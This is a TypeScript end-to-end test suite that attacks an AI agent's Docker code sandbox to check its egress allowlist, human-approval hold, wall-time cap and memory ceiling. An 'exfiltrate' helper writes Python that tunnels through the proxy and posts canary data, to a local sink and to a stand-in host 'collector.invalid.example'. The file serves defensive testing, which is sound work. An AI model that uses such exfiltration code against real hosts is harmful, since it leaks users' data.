// #396: the sandbox, attacked — exfiltration, approval, and the caps.
//
// The half of that issue that needs a Docker daemon. Real containers, the real
// runner process, a real per-run network with no route out, and a real egress
// hop. **Nothing here is stubbed**, and #396's acceptance says why: "the
// positive controls fail if the runner is stubbed out". A stub would make the
// central claim vacuous — "the unlisted host reached nothing" is true of a
// runner that reaches nothing at all.
//
// ## The sink, and why the canary needs somewhere to arrive
//
// The suite's standing rule is that a negative assertion about a secret is worth
// nothing without proof the secret was ever in flight. So this file stands up a
// listener the sheet *does* allow, has generated code send the canary to it, and
// reads it back out of the listener's own log. Only then does "the unlisted host
// saw nothing" mean anything.
//
// The listener speaks plain HTTP and the code reaches it by opening a CONNECT
// tunnel and writing a request inside — which is what a real exfiltration would
// do, and is also the only thing the hop offers: it speaks CONNECT and refuses
// absolute-form requests, so that it reads a host and never a payload.
//
// ## The gate
//
// Two-sided, as `apps/runner/src/sandbox.docker.test.ts` is, and probed
// synchronously at module load for the reason that file records: `describe`'s
// `skip` option is read at collection, before any `beforeAll`, so a flag set in
// a hook is still false when the decision is made and the suite skips itself in
// CI as cheerfully as on a laptop.
//
//   - No daemon, not CI — skipped, so the rest of the suite runs anywhere.
//   - No daemon, CI=true — this file fails at import. CI has one, and quietly
//     reporting green on #396's acceptance is the false comfort the repository's
//     "a test that encodes a gap" rule exists to forbid.

import { after as afterAll, before as beforeAll, describe, it } from "node:test";
import { expect } from "expect";
import { execFileSync } from "node:child_process";
import {
  CHANNEL,
  EGRESS_NETWORK,
  auditRows,
  calls,
  dockerSocketPath,
  prepareSandboxFixtures,
  rigOf,
  says,
  spendFor,
  startRig,
  waitForApprovalCard
} from "./harness/index.js";
import type { Rig } from "./harness/index.js";

const SETUP_MS = 300_000;
const CASE_MS = 180_000;

const APPROVER = "U0BOSS";
const AMBER = "#F5B544";
const RED = "#FF6B5B";

/**
 * The exfiltration canary.
 *
 * Its own string rather than `CANARY` from the harness: that one is a *vault
 * credential* and its whole claim is that it never leaves the proxy. This is
 * channel data the model puts into code on purpose, and the claim about it is
 * the opposite — it must reach the allowed host, and nowhere else.
 */
const PAYLOAD = {
  /** The allowed case, which must arrive. */
  allowed: "libero-e2e-exfil-allowed-2f7c41ab90d6e35814cf0a72bd693e5f",
  /** The denied case, which must not. */
  denied: "libero-e2e-exfil-denied-6b90d4c1f5827ae3049fbc61d287a05e",
  /** The no-`[egress]` case, which must not either, for a different reason. */
  noBlock: "libero-e2e-exfil-noblock-c73a1f5e2098b64dfa5107e8c39b24d6",
  /** The approval case, which must not until a human says so. */
  approval: "libero-e2e-exfil-approval-91dec4a706b8f253ea1b9d40c6785f3a"
} as const;

/** A host no sheet here lists, and nothing resolves. It is never dialled. */
const UNLISTED_HOST = "collector.invalid.example";

/** The listener the sheets do allow, by the name Docker's DNS gives it. */
const SINK = "libero-e2e-sink";

const socketPresent = dockerSocketPath() !== null;
const inCi = process.env["CI"] === "true" || process.env["CI"] === "1";

if (inCi && !socketPresent) {
  throw new Error(
    "e2e: CI=true and no Docker socket. These are #396's acceptance cases and must not be skipped in CI."
  );
}

const mention = (eventId: string) => ({
  teamId: "T024BE7LD",
  channelId: CHANNEL,
  userId: "U024BE7LH",
  text: "<@U0BOTBOTB> go",
  ts: "1758000000.000100",
  threadTs: "1758000000.000100",
  eventId
});

/**
 * Code that opens a CONNECT tunnel through the hop and posts the payload.
 *
 * Written as the model would write it, and it is the shape of a real
 * exfiltration: the hop hands back a raw tunnel, and what goes inside it is the
 * caller's business. The hop never sees the body, which is the property that
 * makes it an allowlist check rather than a second redaction point.
 */
const exfiltrate = (host: string, payload: string) => `
import os, socket
proxy = os.environ["HTTPS_PROXY"].replace("http://", "").split(":")
s = socket.create_connection((proxy[0], int(proxy[1])), timeout=20)
s.sendall(b"CONNECT ${host}:8080 HTTP/1.1\\r\\nHost: ${host}:8080\\r\\n\\r\\n")
reply = s.recv(256)
print("tunnel:", reply.split(b"\\r\\n")[0].decode())
if b"200" not in reply:
    raise SystemExit("refused at the hop")
body = b"${payload}"
s.sendall(b"POST / HTTP/1.1\\r\\nHost: ${host}\\r\\nContent-Length: %d\\r\\n\\r\\n%s" % (len(body), body))
print("sent")
`;

/** Everything the sink has been told, as one string. */
function sinkLog(): string {
  return execFileSync("docker", ["logs", SINK], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
}

/**
 * Wait for the sink to have been told something, or give up.
 *
 * `deliverMention` resolves when the *task* is done, and the daemon's log pipe
 * is a separate thing that settles a moment later — so a single read right after
 * the task is a race, and it lost once already. Polling here rather than
 * sleeping keeps a passing case fast.
 *
 * Only the positive direction polls. A case asserting the sink learned *nothing*
 * cannot wait for an absence, and does not need to: it waits for the run to
 * finish and then reads once, which is the same instant this one starts from.
 */
async function waitForSink(needle: string, timeoutMs = 20_000): Promise<string> {
  const until = Date.now() + timeoutMs;
  for (;;) {
    const log = sinkLog();
    if (log.includes(needle)) return log;
    if (Date.now() > until) return log;
    await new Promise(resolve => setTimeout(resolve, 250));
  }
}

function startSink(): void {
  execFileSync("docker", ["rm", "-f", SINK], { stdio: "pipe" });
  execFileSync(
    "docker",
    [
      "run", "-d", "--name", SINK, "--network", EGRESS_NETWORK, "python:3.13-alpine",
      "python3", "-u", "-c",
      // Prints every byte it is sent and answers 200. Unbuffered, so `docker
      // logs` has the payload the moment it arrives rather than at exit.
      // Prints READY before serving so `startSink` can wait for a listening
      // socket rather than for the daemon to have started a container — the
      // same race the runner hit between its hop and its sandbox.
      "import socketserver\n" +
        "class H(socketserver.StreamRequestHandler):\n" +
        "    def handle(self):\n" +
        "        data = self.request.recv(65536)\n" +
        "        print('GOT', data.decode('utf8', 'replace'), flush=True)\n" +
        "        self.request.sendall(b'HTTP/1.1 200 OK\\r\\nContent-Length: 0\\r\\n\\r\\n')\n" +
        "socketserver.TCPServer.allow_reuse_address = True\n" +
        "srv = socketserver.TCPServer(('0.0.0.0', 8080), H)\n" +
        "print('READY', flush=True)\n" +
        "srv.serve_forever()\n"
    ],
    { stdio: "pipe" }
  );

  const until = Date.now() + 60_000;
  for (;;) {
    if (sinkLog().includes("READY")) return;
    if (Date.now() > until) throw new Error(`e2e: the sink did not start. Log:\n${sinkLog()}`);
    execFileSync("sleep", ["0.25"]);
  }
}

function stopSink(): void {
  try {
    execFileSync("docker", ["rm", "-f", SINK], { stdio: "pipe" });
  } catch {
    // Already gone is the state wanted.
  }
}

/** The sheet every case here starts from: the sandbox granted, the sink allowed. */
const SHEET = (approval?: "none", timeoutSeconds?: number) => ({
  tools: [{ name: "list_prs", approval: "none" as const }],
  builtins: [
    {
      name: "run_code",
      ...(approval === undefined ? {} : { approval }),
      ...(timeoutSeconds === undefined ? {} : { timeoutSeconds })
    }
  ],
  egress: [SINK]
});

describe("attacking the sandbox", { skip: !socketPresent }, () => {
  beforeAll(() => {
    prepareSandboxFixtures();
    startSink();
  }, { timeout: SETUP_MS });

  afterAll(() => {
    stopSink();
  }, { timeout: SETUP_MS });

  describeReachesTheAllowedHost();
  describeDeniedTheUnlistedHost();
  describeNoBlockIsNoNetwork();
  describeApproval();
  describeWallTimeCap();
  describeDeploymentCeiling();
});

/**
 * The positive control, and it comes first on purpose.
 *
 * Every "reached nothing" below is worth exactly as much as this case. It is
 * also what #396 means by "the positive controls fail if the runner is stubbed
 * out": a stub answers a result shape and never moves a byte, so the payload
 * would not be in the sink's log and this would fail.
 */
function describeReachesTheAllowedHost(): void {
  let rig: Rig | undefined;

  beforeAll(async () => {
    rig = await startRig({
      runner: "egress",
      sheets: { [CHANNEL]: SHEET("none") },
      script: [calls("run_code", { code: exfiltrate(SINK, PAYLOAD.allowed) }), says("sent")]
    });
  }, { timeout: SETUP_MS });

  afterAll(async () => {
    await rig?.stop();
  }, { timeout: SETUP_MS });

  it("carries the payload to a host the sheet allows", { timeout: CASE_MS }, async () => {
    const { agent, auditDb, budgetDb, model } = rigOf(rig);
    await agent.slack.deliverMention(mention("Ev00000910"));

    // The call first, then its effect. A sink assertion that failed because the
    // proxy answered `not_implemented` would read as an exfiltration success.
    const rows = auditRows(auditDb);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ server: "libero", tool: "run_code", outcome: "ran" });
    expect(spendFor(budgetDb, CHANNEL).toolCalls).toBe(1);

    // The program's own account, before the sink's. `ran` says the call was
    // served and says nothing about whether the code worked — so without this a
    // hop that refused the tunnel and a hop that was not there both look like a
    // silent sink, which is exactly how this failed on CI once.
    expect(JSON.stringify(model.seen)).toContain("200 Connection Established");

    // The byte really left the container and arrived at the far end. Read out of
    // the listener rather than out of our own result, because a result is this
    // system describing itself.
    expect(await waitForSink(PAYLOAD.allowed)).toContain(PAYLOAD.allowed);
  });
}

/** The attack the security page has described in prose since before there was a surface. */
function describeDeniedTheUnlistedHost(): void {
  let rig: Rig | undefined;

  beforeAll(async () => {
    rig = await startRig({
      runner: "egress",
      sheets: { [CHANNEL]: SHEET("none") },
      script: [
        calls("run_code", { code: `${exfiltrate(UNLISTED_HOST, PAYLOAD.denied)}\nprint("kept going")` }),
        says("refused")
      ]
    });
  }, { timeout: SETUP_MS });

  afterAll(async () => {
    await rig?.stop();
  }, { timeout: SETUP_MS });

  it("refuses a host the sheet does not list, names it, and ends the run", { timeout: CASE_MS }, async () => {
    const { agent, auditDb, model } = rigOf(rig);
    await agent.slack.deliverMention(mention("Ev00000911"));

    const rows = auditRows(auditDb);
    expect(rows).toHaveLength(1);
    // A refusal rather than a `ran` with a failure inside it: the sheet said no,
    // and that is a governance decision the operator's log should carry as one.
    expect(rows[0]).toMatchObject({
      server: "libero",
      tool: "run_code",
      outcome: "refused",
      refusal_reason: "egress_denied",
      // #219's column. Before it, this row could not say which host.
      destination: UNLISTED_HOST
    });

    // The sink never saw this case's payload. Asserted by a marker unique to
    // this case rather than by comparing the log against a snapshot taken
    // earlier: a snapshot couples the assertion to what every other case in the
    // file did first, and that coupling is what made this fail once.
    expect(sinkLog()).not.toContain(PAYLOAD.denied);
    // The model is told, in the words `refusalMessage` gives it — the tool result
    // is where a refusal reaches the loop, and naming the host is what stops the
    // next turn from guessing at the cause. What the channel then reads is the
    // model's own sentence, which is why this asserts the result and not the post.
    expect(JSON.stringify(model.seen)).toContain(UNLISTED_HOST);
  });
}

/** No `[egress]` block is no network at all, which is a stronger claim than a filtered one. */
function describeNoBlockIsNoNetwork(): void {
  let rig: Rig | undefined;

  beforeAll(async () => {
    rig = await startRig({
      runner: "egress",
      sheets: {
        [CHANNEL]: {
          tools: [{ name: "list_prs", approval: "none" }],
          builtins: [{ name: "run_code", approval: "none" }]
          // No `egress` key. The grant an operator makes by saying nothing.
        }
      },
      script: [calls("run_code", { code: exfiltrate(SINK, PAYLOAD.noBlock) }), says("done")]
    });
  }, { timeout: SETUP_MS });

  afterAll(async () => {
    await rig?.stop();
  }, { timeout: SETUP_MS });

  it(
    "gives a channel with no egress block no route to the allowed host either",
    { timeout: CASE_MS },
    async () => {
        const { agent, auditDb } = rigOf(rig);
        await agent.slack.deliverMention(mention("Ev00000912"));

        // The same code that reached the sink in the first case does not reach it
        // now, and the only difference is two lines of team sheet.
        expect(sinkLog()).not.toContain(PAYLOAD.noBlock);
        // `ran`, not `refused`: nothing was denied by a list, because there was no
        // list and no network. The program simply failed, which is a normal answer.
        expect(auditRows(auditDb)[0]).toMatchObject({ tool: "run_code", outcome: "ran" });
      }
  );
}

/**
 * The declared default, through the whole system.
 *
 * `builtins` here carries no `approval` line, and the absence is the hold —
 * `BUILTIN_APPROVAL_DEFAULT` says `run_code` is `"required"`. The assertion that
 * matters is not that a card appeared: it is that **no code ran before the
 * click**, which the sink is what proves.
 */
function describeApproval(): void {
  let declined: Rig | undefined;

  beforeAll(async () => {
    declined = await startRig({
      runner: "egress",
      // No approval line at all.
      sheets: { [CHANNEL]: SHEET() },
      script: [calls("run_code", { code: exfiltrate(SINK, PAYLOAD.approval) }), says("declined")]
    });
  }, { timeout: SETUP_MS });

  afterAll(async () => {
    await declined?.stop();
  }, { timeout: SETUP_MS });

  it(
    "runs no code before the click, and none at all when the card is declined",
    { timeout: CASE_MS },
    async () => {
        const { agent, auditDb } = rigOf(declined);

        const pending = agent.slack.deliverMention(mention("Ev00000913"));
        const card = await waitForApprovalCard(agent);

        expect(card?.card.color).toBe(AMBER);
        // The load-bearing assertion. The container has not run, so the payload the
        // code would send is not at the far end — checked against a listener that
        // demonstrably receives one when a run is allowed.
        expect(sinkLog()).not.toContain(PAYLOAD.approval);

        const ticket = auditRows(auditDb).find(row => row.outcome === "held")?.ticket ?? "";
        expect(ticket).not.toBe("");

        await agent.slack.deliverDecision({
          teamId: "T024BE7LD",
          channelId: CHANNEL,
          userId: APPROVER,
          ticketId: ticket,
          verdict: "deny",
          messageTs: card?.messageTs ?? "",
          threadTs: "1758000000.000100"
        });
        await pending;

        // Still nothing, after the decision as before it.
        expect(sinkLog()).not.toContain(PAYLOAD.approval);
        // Re-read rather than the object captured before the click: the card is
        // edited in place, and the value held here is what it looked like then.
        expect(agent.slack.cardAt(card?.messageTs ?? "")?.color).toBe(RED);

        const rows = auditRows(auditDb);
        expect(rows.map(row => row.outcome)).toEqual(["held", "denied", "refused"]);
        expect(rows[1]?.approver).toBe(APPROVER);
        expect(rows[2]?.refusal_reason).toBe("approval_denied");
      }
  );
}

/** A run that spins past its wall-time cap is killed within it. */
function describeWallTimeCap(): void {
  let rig: Rig | undefined;

  beforeAll(async () => {
    rig = await startRig({
      runner: "egress",
      // Five seconds, set by the sheet — the cap is the channel's, resolved by
      // the decision that authorized the call.
      sheets: { [CHANNEL]: SHEET("none", 5) },
      script: [
        calls("run_code", { code: 'import time\nprint("before", flush=True)\ntime.sleep(600)' }),
        says("timed out")
      ]
    });
  }, { timeout: SETUP_MS });

  afterAll(async () => {
    await rig?.stop();
  }, { timeout: SETUP_MS });

  it("kills a run at the sheet's cap and still answers", { timeout: CASE_MS }, async () => {
    const { agent, auditDb } = rigOf(rig);
    const started = Date.now();
    await agent.slack.deliverMention(mention("Ev00000914"));
    const elapsed = Date.now() - started;

    // Well inside the 600s the program asked for. Generous against the cap
    // itself, because what is being asserted is that the cap bounded the run at
    // all — the exact number is apps/runner's case, not this one.
    expect(elapsed).toBeLessThan(120_000);

    // A kill is not a refusal and not a ProxyError: the request was served, and
    // what the program printed before the deadline is a real answer.
    const rows = auditRows(auditDb);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ tool: "run_code", outcome: "ran" });
    expect(rows[0]?.refusal_reason ?? null).toBeNull();
  });
}

/**
 * The operator's ceiling actually bounds a real container (#405).
 *
 * The claim `clampCaps` cannot make on its own. That function is arithmetic and
 * `apps/runner/src/run.test.ts` pins the arithmetic; what is unproven until a
 * daemon is involved is that the clamped number is the one that reaches the
 * cgroup — that nothing downstream re-reads `request.caps` and sizes a spec, a
 * tmpfs or a wall-time wait from what the sheet asked for instead.
 *
 * So the program is asked how much memory it actually has. The sheet says 2048
 * MB and the deployment allows 256, and a run that came back reporting 2 GB
 * would mean the ceiling was a number in a log line and nowhere else.
 *
 * It is in this file rather than beside the other #405 cases because it is the
 * one that needs a Docker daemon, which is the split this suite already keeps.
 */
function describeDeploymentCeiling(): void {
  let rig: Rig | undefined;

  beforeAll(async () => {
    rig = await startRig({
      runner: "egress",
      // The deployment's number, well below what the sheet below asks for.
      runnerMaxMemoryMb: 256,
      sheets: {
        [CHANNEL]: {
          tools: [{ name: "list_prs", approval: "none" as const }],
          builtins: [{ name: "run_code", approval: "none" as const, memoryMb: 2048 }],
          egress: [SINK]
        }
      },
      // cgroup v2 first, then v1 — the path differs between hosts and the
      // deployment guide names both Debian and AL2023.
      script: [
        calls("run_code", {
          code: [
            "def limit():",
            "    try:",
            "        return int(open('/sys/fs/cgroup/memory.max').read().strip())",
            "    except OSError:",
            "        return int(open('/sys/fs/cgroup/memory/memory.limit_in_bytes').read().strip())",
            "print('limit_mb', limit() // (1024 * 1024))"
          ].join("\n")
        }),
        says("done")
      ]
    });
  }, { timeout: SETUP_MS });

  afterAll(async () => {
    await rig?.stop();
  }, { timeout: SETUP_MS });

  it("gives the container the deployment's cap, not the sheet's", { timeout: CASE_MS }, async () => {
    const { agent, model, auditDb } = rigOf(rig);
    await agent.slack.deliverMention(mention("Ev00000915"));

    // What the container was actually given. Read from inside it, because the
    // point of this case is that the number reached the kernel.
    const result = model.seen.at(-1)?.messages.map(message => JSON.stringify(message)).join("\n") ?? "";
    expect(result).toContain("limit_mb 256");
    expect(result).not.toContain("limit_mb 2048");

    // Clamped, not refused. The sheet is an operator-authored grant bounded by
    // the same operator's limit, so the run happens and the row says it ran.
    const rows = auditRows(auditDb);
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ tool: "run_code", outcome: "ran" });
    expect(rows[0]?.refusal_reason ?? null).toBeNull();

    // And the channel is told, in the sheet's own field name — the whole reason
    // the clamp is not silent.
    expect(result).toContain("memory_mb 2048 to 256");

    // The operator's half of that — the runner's `caps_clamped` line — is
    // asserted in apps/runner/src/run.test.ts, against the callback rather than
    // against a log grep through a child process's stdout.
  });
}
